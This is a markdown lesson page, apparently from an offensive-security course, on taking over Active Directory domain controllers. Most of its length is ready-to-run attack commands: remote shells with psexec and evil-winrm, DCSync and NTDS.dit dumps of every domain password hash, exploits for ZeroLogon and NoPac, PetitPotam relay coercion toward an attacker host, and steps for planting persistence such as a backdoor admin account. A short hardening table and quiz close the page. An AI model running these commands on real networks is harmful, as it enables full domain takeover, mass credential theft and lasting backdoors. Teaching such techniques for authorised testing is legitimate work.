# Domain Controller Compromise

## Unit 8 - Topic 2 | Domain Dominance

---

## Overview

**Domain Controller compromise** is the ultimate objective in an AD attack — gaining full control over one or more DCs provides access to the entire domain's authentication database, Group Policy, and all domain services. This topic covers techniques for directly compromising DCs.

---

## 1. DC Compromise Methods

```
DOMAIN CONTROLLER ATTACK VECTORS:

WITH DA CREDENTIALS:
├── psexec.py → SYSTEM shell on DC
├── wmiexec.py → Admin shell on DC
├── evil-winrm → PowerShell on DC
├── RDP → Interactive GUI access
├── DCSync → Remote hash extraction
└── secretsdump.py → Full credential dump

WITHOUT DA (Direct DC Attack):
├── ZeroLogon (CVE-2020-1472) → Reset DC password
├── PrintNightmare (CVE-2021-34527) → RCE on DC
├── PetitPotam + NTLM Relay → Coerce DC auth → relay
├── NoPac (CVE-2021-42287) → Forge DC ticket
├── Silver Ticket (LDAP service) → DCSync
├── Unconstrained delegation → Capture DC TGT
└── AD CS ESC8 → Get DC certificate → DCSync

POST-COMPROMISE:
├── DCSync all domain hashes
├── Access NTDS.dit database
├── Modify Group Policy
├── Create persistence mechanisms
├── Pivot to other domains/forests
└── Access SYSVOL, shares, and configs
```

---

## 2. DC Access with Credentials

```bash
# === REMOTE SHELL ===
# PsExec (SYSTEM shell):
psexec.py corp.local/da:pass@dc01
# Gets SYSTEM on DC

# WMIExec (Admin shell, stealthier):
wmiexec.py corp.local/da:pass@dc01

# Evil-WinRM (PowerShell):
evil-winrm -i dc01 -u da -p pass

# With hash:
psexec.py corp.local/da@dc01 -hashes :NTLM_HASH

# === DCSYNC (No shell needed!) ===
# Remote credential extraction:
secretsdump.py corp.local/da:pass@dc01 -just-dc
# Dumps ALL user hashes via DRS replication
# No need to touch NTDS.dit file!

# Specific user:
secretsdump.py corp.local/da:pass@dc01 -just-dc-user krbtgt

# Full dump (SAM + LSA + NTDS):
secretsdump.py corp.local/da:pass@dc01

# CrackMapExec:
crackmapexec smb dc01 -u da -p pass --ntds

# === NTDS.DIT EXTRACTION (File-based) ===
# If you need offline access to the database:

# Volume Shadow Copy:
wmiexec.py corp.local/da:pass@dc01
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.save

# ntdsutil:
ntdsutil "activate instance ntds" "ifm" "create full C:\temp" q q

# Parse offline:
secretsdump.py -ntds ntds.dit -system system.save LOCAL
```

---

## 3. DC Compromise Without DA

```bash
# === ZEROLOGON (CVE-2020-1472) ===
# Resets DC machine account password to empty!
# CRITICAL: Can break the DC — use with caution!

# Exploit:
python3 zerologon_tester.py dc01 dc01_ip
# If vulnerable:
python3 cve-2020-1472-exploit.py dc01 dc01_ip
# DC$ account password = empty

# DCSync with empty password:
secretsdump.py -no-pass -just-dc corp.local/dc01\$@dc01

# RESTORE IMMEDIATELY after getting hashes!
# Use the Administrator hash to restore:
python3 restorepassword.py corp.local/dc01@dc01 -target-ip dc01_ip \
  -hexpass ORIGINAL_HEX_PASSWORD

# === NOPAC (CVE-2021-42287/42278) ===
# Impersonate DC via computer account name confusion
python3 noPac.py corp.local/user:pass -dc-ip dc01 \
  -dc-host dc01 --impersonate administrator -dump
# Gets NTLM hash of Administrator!

# === PETITPOTAM + NTLM RELAY ===
# Coerce DC to authenticate to attacker → relay to CA
# Terminal 1:
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
# Terminal 2:
python3 PetitPotam.py attacker_ip dc01_ip
# Result: DC certificate!
certipy auth -pfx dc01.pfx -dc-ip dc01
# Gets DC$ NTLM hash → DCSync

# === PRINTERBUG + UNCONSTRAINED DELEGATION ===
# If you have access to unconstrained delegation machine:
# Terminal 1 (on unconstrained machine):
.\Rubeus.exe monitor /interval:5 /filteruser:dc01$
# Terminal 2 (coerce DC):
python3 printerbug.py corp.local/user:pass@dc01 \
  unconstrained_machine
# Capture DC$ TGT → DCSync!
```

---

## 4. Post-DC Compromise Actions

```bash
# === IMMEDIATE ACTIONS ===

# 1. Extract ALL hashes:
secretsdump.py corp.local/da:pass@dc01 -just-dc
# Save output — this is the crown jewels

# 2. Get krbtgt hash (Golden Ticket):
secretsdump.py corp.local/da:pass@dc01 \
  -just-dc-user krbtgt
# Store securely offline

# 3. Check for additional DCs:
Get-ADDomainController -Filter *
# Compromise all DCs for complete control

# 4. Enumerate trusts:
Get-ADTrust -Filter *
# Identify paths to other domains

# 5. Install persistence (multiple mechanisms):
# a. Golden Ticket (store krbtgt hash)
# b. DSRM (extract hash, set registry)
# c. AdminSDHolder (add backdoor user)
# d. DCSync rights (grant to backup account)
# e. Certificate (request long-lived cert)

# === SENSITIVE DATA ACCESS ===
# SYSVOL (scripts, GPP):
dir \\dc01\SYSVOL\corp.local\

# Admin shares:
dir \\dc01\C$\
dir \\dc01\ADMIN$\

# DNS records:
dnscmd dc01 /enumrecords corp.local .

# DHCP data:
netsh dhcp server \\dc01 show scope
```

---

## 5. DC Hardening Overview

| Defense | Description |
|---------|-------------|
| **Patch management** | Apply security patches immediately (ZeroLogon, NoPac, etc.) |
| **Network isolation** | Restrict DC access to admin networks only |
| **Credential Guard** | Enable on all DCs |
| **LSASS protection** | Enable PPL for LSASS |
| **Admin tiering** | Only Tier 0 accounts access DCs |
| **Monitoring** | Heavy monitoring of DC events |
| **Disable NTLM** | Force Kerberos on DCs where possible |
| **SMB signing** | Require SMB signing (prevents relay) |
| **Disable spooler** | Disable Print Spooler on DCs |

---

## Summary Table

| Method | Requires | Risk |
|--------|----------|:----:|
| **DCSync** | DA or DCSync rights | 🟢 Low |
| **PsExec to DC** | DA credentials | 🟢 Low |
| **ZeroLogon** | Network access only | 🔴 High (can break DC) |
| **NoPac** | Domain user | 🟡 Medium |
| **PetitPotam** | Domain user + CA | 🟡 Medium |
| **NTDS.dit extract** | SYSTEM on DC | 🟡 Medium |

---

## Quick Revision Questions

1. **What is the safest method to extract all domain hashes?**
2. **Why is ZeroLogon considered dangerous for real engagements?**
3. **What should you do immediately after DC compromise?**
4. **How does PetitPotam lead to DC compromise?**
5. **Why should the Print Spooler service be disabled on DCs?**

---

[← Previous: Domain Admin Escalation](01-domain-admin-escalation.md) | [Next: Forest Compromise →](03-forest-compromise.md)

---

*Unit 8 - Topic 2 of 5 | [Back to README](../README.md)*
